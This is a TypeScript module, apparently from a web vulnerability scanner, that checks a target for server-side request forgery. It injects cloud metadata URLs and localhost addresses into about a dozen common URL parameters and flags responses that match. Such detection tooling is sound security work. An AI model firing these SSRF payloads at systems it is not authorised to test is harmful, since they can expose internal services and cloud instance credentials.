import { ts } from '../../context';
import { probe } from '../../utils/http';
import type { RealFinding, Target, LogFn } from '../../context';

const METADATA_ENDPOINTS = [
  { url: 'http://169.254.169.254/latest/meta-data/', service: 'AWS EC2 Instance Metadata', indicator: 'ami-id', severity: 'critical' as const, cvss: 9.8 },
  { url: 'http://169.254.169.254/computeMetadata/v1/', service: 'GCP Instance Metadata', indicator: 'project-id', severity: 'critical' as const, cvss: 9.8 },
  { url: 'http://169.254.169.254/metadata/v1/', service: 'Azure Instance Metadata', indicator: 'subscriptionId', severity: 'critical' as const, cvss: 9.8 },
  { url: 'http://metadata.google.internal/computeMetadata/v1/', service: 'GCP Metadata (internal)', indicator: 'google', severity: 'critical' as const, cvss: 9.8 },
  { url: 'http://100.100.100.200/latest/meta-data/', service: 'Alibaba Cloud Metadata', indicator: 'instance-id', severity: 'critical' as const, cvss: 9.8 },
];

const URL_PARAMS = ['url', 'uri', 'src', 'source', 'dest', 'destination', 'redirect', 'next', 'return', 'link', 'page', 'file', 'path', 'webhook', 'callback', 'feed', 'import', 'load'];

export async function checkSSRF(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing SSRF — cloud metadata endpoints...`);

  for (const { url: metaUrl, service, indicator, severity, cvss } of METADATA_ENDPOINTS) {
    for (const param of URL_PARAMS.slice(0, 10)) {
      const probeUrl = `${target.url.replace(/\/$/, '')}?${param}=${encodeURIComponent(metaUrl)}`;
      const r = await probe(probeUrl, { timeoutMs: 10_000 });
      if (!r) continue;
      if (r.body.toLowerCase().includes(indicator.toLowerCase())) {
        findings.push({
          title: `SSRF — Cloud Metadata Service Accessed (${service})`,
          severity,
          verification: 'verified',
          confidence: 98,
          cvss,
          cve: null,
          description: `The '${param}' parameter caused the server to retrieve ${service} at ${metaUrl}.`,
          evidence: `PROBE: ${probeUrl}\nHTTP ${r.status} — indicator "${indicator}" in response\nExcerpt: ${r.body.slice(0, 300)}`,
          remediation: 'Implement server-side URL allowlisting. Block access to metadata IPs.',
        });
        await onLog(`[${ts()}] ⚠ SSRF CONFIRMED: ${service}`);
        return findings;
      }
    }
  }

  // Blind SSRF: check localhost/internal services
  const blindTargets = [
    'http://localhost/', 'http://127.0.0.1/', 'http://0.0.0.0/', 'http://[::1]/',
    'http://127.0.0.1:22/', 'http://127.0.0.1:3306/', 'http://127.0.0.1:6379/',
  ];
  await onLog(`[${ts()}] Testing blind SSRF against localhost...`);
  for (const blindUrl of blindTargets.slice(0, 4)) {
    for (const param of URL_PARAMS.slice(0, 6)) {
      const probeUrl = `${target.url.replace(/\/$/, '')}?${param}=${encodeURIComponent(blindUrl)}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      const body = r.body.toLowerCase();
      const hasInternalContent = body.includes('ssh') || body.includes('mysql') || body.includes('redis') || body.includes('localhost') || (r.status === 200 && r.body.length > 100 && body.includes('<!doctype'));
      if (hasInternalContent) {
        findings.push({
          title: `SSRF — Internal Service Response via '${param}' (Blind)`,
          severity: 'high',
          verification: 'suspected',
          confidence: 72,
          cvss: 8.1,
          cve: null,
          description: `Request to '${blindUrl}' via '${param}' returned internal service content.`,
          evidence: `PROBE: ${probeUrl}\nHTTP ${r.status} — internal indicators in response`,
          remediation: 'Block requests to RFC-1918 and loopback addresses.',
        });
        await onLog(`[${ts()}] ⚠ SSRF BLIND SIGNAL: ${param}=${blindUrl}`);
        break;
      }
    }
  }

  if (findings.length === 0) await onLog(`[${ts()}] No SSRF indicators found`);
  return findings;
}
